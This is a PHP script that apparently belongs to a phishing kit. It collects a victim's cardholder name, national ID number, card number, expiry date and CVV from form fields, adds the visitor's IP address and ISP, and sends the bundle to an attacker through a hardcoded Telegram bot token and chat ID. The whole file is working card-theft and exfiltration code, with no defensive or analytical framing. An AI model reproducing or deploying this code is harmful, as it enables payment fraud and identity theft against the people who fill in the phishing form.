<?php
session_start();
$ip = getenv("REMOTE_ADDR");
$isp = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$_SESSION['dni'] = $_POST['v4'];

$_SESSION['titular'] = $_POST['v3'];
$_SESSION['card'] = $_POST['v5'];
$_SESSION['mm'] = $_POST['v6'];

$_SESSION['cvv'] = $_POST['v7'];


$ip = getenv("REMOTE_ADDR");

$msg .= "========== Importante =========\n";
    $msg .= "ISP    : ". $isp."\n";
    $msg .= "IP    : ".$ip."\n\n";
 $msg .= "========= Datos Titular ========\n";
 
 $msg .= "Titular : ".$_SESSION['titular']."\n";
 $msg .= "DNI     : ".$_SESSION['dni']."\n";
 $msg .= "Tarjeta : ".$_SESSION['card']."\n";
 $msg .= "Vto. : ".$_SESSION['mm']."\n";

 $msg .= "CVV     : ".$_SESSION['cvv']."\n";

include('config.php');

define('BOK', '6973852895:AAHvW1-VmBV7wQiu9QJq1jZWpx-B1N7G8Rw');
define('CHID', '-4074786076');
define('API_URL', 'https://api.telegram.org/bot'.BOK.'/');

enviar_telegram($msg);

function enviar_telegram($msj)  {
 $queryArray = [
  'chat_id' => CHID,
  'text' => $msj,
 ];
 $url = 'https://api.telegram.org/bot'.BOK.'/sendMessage?'. http_build_query($queryArray);
 $result = file_get_contents($url);
}

?>